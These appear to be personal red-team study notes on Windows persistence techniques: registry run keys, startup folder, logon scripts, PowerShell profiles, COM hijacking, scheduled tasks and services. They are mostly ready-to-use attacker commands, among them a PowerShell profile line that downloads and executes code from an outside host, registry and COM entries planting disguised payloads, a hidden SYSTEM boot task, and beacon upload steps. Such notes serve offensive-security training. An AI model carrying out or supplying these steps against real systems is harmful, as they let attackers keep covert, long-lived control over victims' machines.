tactic used to maintain access across reboots/interruptions
techniques typically involve making config changes to re-execute a payload

common techniques:
    boot & logon autostart
    logon scripts
    powershell profile
    scheduled tasks
    component object model (COM) hijacking

boot & logon autostart:
    collection of techniques where an adversary configures a computer to automatically execute a payload during startup or login
    registry run keys:
        the windows registry contains several keys that allow programs to run when a user logs in:
            HKCU\Software\Microsoft\Windows\CurrentVersion\Run (persistent)
            HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce (deleted after 1st run)
        to update a reg key:
            reg_set <host:optional> <hive> <key> <value> <type> <data>
            e.g. reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
        to check a reg key:
            reg_query <hive> <key> <value>
            e.g. reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
        to delete a reg key:
            reg_delete <hive> <key> <value>
    startup folder:
        programs located in this folder run automatically on login
        folder path: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
        simply move an exe into this folder and remove when persistence is no longer required

logon script:
    HKCU\Envrionment reg key contains a user's env variables
    we can add an env variable called UserInitMprLogonScript with the value of our exe to have it run upon user login
    e.g. reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe

powershell profile:
    profile.ps1 is a script that executes when a new powershell window is opened by a user, commonly used to alter appearance or behavior
    this script can be stored here, $HOME\Documents\WindowsPowerShell\Profile.ps1
        NOTE: if this directory does not exist we can create it
    ex file: $_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }

scheduled task:
    tasks run via the windows task scheduler based on pre-defined triggers (time, user logon, idle, computer starts, etc.)
    these tasks are defined in XML (example code in SchTaskXML)
    to create a new task, run 'schtaskscreate \<name> XML CREATE'
    to delete a task, run schtasksdelete

COM hijacking:
    COM provides an interoperability standard so that applications written in different languages can use the same software libraries
    every COM object is tracked by a CLSID and can be found in HKEY_CLASSES_ROOT\CLSID
        each CLSID is then broken into InProcServer32 (path to the DLL) and LocalServer32 (path to exe)
    COM hijacking is when an adversary alters a COM entry to trick an application into executing malicious code
    the classes in HKEY_CLASSES_ROOT are a combination of HKEY_LOCAL_MACHINE\Software\Classes and HKEY_CURRENT_USER\Software\Classes
    methods for hijacking:
        COM entries in the HKCU take priority over HKLM! so if a COM entry is only defined in HKLM, we can write a new entry into the HKCU hive for that CLSID
        if a COM entry points to a DLL or EXE that doesn't exist, we may be able to write our malicious file to that location
    finding COM hijacks:
        using procmon, add some filters:
            Operation is RegOpenKey
            Path contains InprocServer32 or LocalServer32
            Result is NAME NOT FOUND
    example:
        say we want to use the following COM object
            HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32
        we can check if it exists in HKLM:
            Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
        and then check if it exists in HKCU:
            Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
        if it does not exist in HKCU, we can create it:
            PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
            PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
            PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"

        test by triggering the application that loads the COM object

elevated persistence:
    once we sucessfully elevate privileges, we may want to establish persistence again
    schtasks:
        example scheduled task:
            <Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
            	<Triggers>
            		<BootTrigger>
            			<Enabled>true</Enabled>
            		</BootTrigger>
            	</Triggers>
            	<Principals>
            		<Principal>
            			<UserId>NT AUTHORITY\SYSTEM</UserId>
            			<RunLevel>HighestAvailable</RunLevel>
            		</Principal>
            	</Principals>
            	<Settings>
            		<AllowStartOnDemand>true</AllowStartOnDemand>
            		<Enabled>true</Enabled>
            		<Hidden>true</Hidden>
            	</Settings>
            	<Actions>
            		<Exec>
            			<Command>C:\Windows\System32\beacon_x64.exe</Command>
            		</Exec>
            	</Actions>
            </Task>
        then within the beacon, run:
            beacon> cd C:\Windows\System32
            beacon> upload C:\Payloads\beacon_x64.exe
            beacon> schtaskscreate \Beacon XML CREATE

    windows service:
        we can create our own service that runs when the computer boots up:
            beacon> cd C:\Windows\System32\
            beacon> upload C:\Payloads\beacon_x64.svc.exe
            beacon> mv beacon_x64.svc.exe debug_svc.exe
            beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
        verify the service has been created:
            sc_qc dbgsvc

    windows management instrumentation:
        allows for querying of WMI objects using SQL-like language (WQL)
        example query to trigger an alert within 5 seconds of notepad.exe being launched:
            SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'
        
